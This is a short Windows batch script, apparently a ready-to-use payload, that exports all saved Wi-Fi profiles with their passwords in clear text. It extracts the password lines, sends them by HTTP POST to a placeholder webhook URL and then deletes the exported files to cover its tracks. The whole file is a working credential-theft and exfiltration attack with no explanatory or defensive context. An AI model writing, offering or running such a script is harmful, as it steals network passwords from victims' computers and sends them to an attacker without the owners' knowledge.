@echo [off]
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial'  > WiFi-Key
powershell Invoke-WebRequest -Uri <your webhook url> -Method POST -InFile WiFi-Key
del Wi* /s/f/q
exit